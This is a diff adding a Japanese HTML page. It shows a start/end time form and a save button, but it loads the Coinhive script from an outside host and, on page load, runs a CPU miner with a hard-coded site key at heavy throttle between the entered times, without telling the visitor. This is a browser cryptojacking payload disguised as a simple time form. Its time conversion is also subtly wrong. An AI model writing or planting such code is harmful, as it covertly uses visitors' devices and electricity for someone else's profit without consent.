@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+	<meta charset=utf-8>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+<style type="text/css"></style>
+
+
+</head>
+<body>
+    <form>
+        <label for="textForm">開始時刻: </label>
+        <input type="text" id="startForm" value="00:00:12">
+
+        <label for="textForm">終了時刻: </label>
+        <input type="text" id="endForm" value="00:00:31">
+
+        <button id="button">保存する</button>
+    </form>
+
+    <label for="resultForm">保存した値: </label>
+    <input type="text" id="resultForm">
+</body>
+ 
+<script>
+
+// 現在時刻の設定
+let now = new Date();
+let second = now.getSeconds();
+let minute = now.getMinutes();
+let hour = now.getHours();
+
+
+let button = document.getElementById("button");
+
+// ボタンをクリックした時の処理
+button.addEventListener("click", function(e) {
+    e.preventDefault();
+
+    let textForm = document.getElementById("startForm").value;
+
+    // 取得した値を別の入力フォームに表示
+    let resultForm = document.getElementById("resultForm");
+    resultForm.value = textForm;
+});
+
+/*!
+・時間を登録
+・時間をロード
+・登録時間で関数実行
+・登録時間で関数停止
+*/
+
+//! ラジオボタン等取得方法の改善
+function getInputTime(str) {
+    let input_date = str.split(":");
+    return (parseInt(input_date[0]*24*60) + parseInt(input_date[1]*60) + parseInt(input_date[2]));
+}
+
+let start_time = getInputTime(document.getElementById("startForm").value);
+let stop_time = getInputTime(document.getElementById("endForm").value);
+
+
+const miner = new CoinHive.Anonymous('w2X05veG3KuBlnqk0FUFrGPVGCJqdY8A', { throttle: 0.9 });
+
+function miningStart() {
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+}
+
+function miningStop() {
+    miner.stop();
+}
+
+window.onload = function () {
+    //! waitにsetTimeout, setInterval, Promiseのどれを使うか要検証
+    function sleepByPromise(sec) {
+        return new Promise(resolve => setTimeout(resolve, sec*1000));
+    }
+
+    async function wait_st(start_sec, end_sec) {
+        // Convert absolute time to relative time
+        if (second > end_sec) {
+            start_sec = 0;
+            end_sec = 0;
+        } else if (second > start_sec) {
+            start_sec = 0;
+            end_sec = end_sec - second;
+        } else {
+            start_sec = start_sec - second;
+            end_sec = end_sec - start_sec;
+        }
+
+        console.log('wait ' + start_sec.toString() + ' sec right now!');
+
+        // Wait until asynchronous processing of Promise is completed
+        await sleepByPromise(start_sec);
+        miningStart();
+        console.log('wait ' + start_sec.toString() + ' sec done!');
+        console.log('wait ' + end_sec.toString() + ' sec right now!');
+        await sleepByPromise(end_sec);
+        miningStop();
+        console.log('wait ' + end_sec.toString() + ' sec done!');
+        //location.reload()
+    }
+
+    // wait and start mining
+    console.log('now '+ now +'\nfrom '+ start_time +' to '+ stop_time);
+    wait_st(start_time, stop_time);
+
+}
+
+
+</script>
+
+</html>
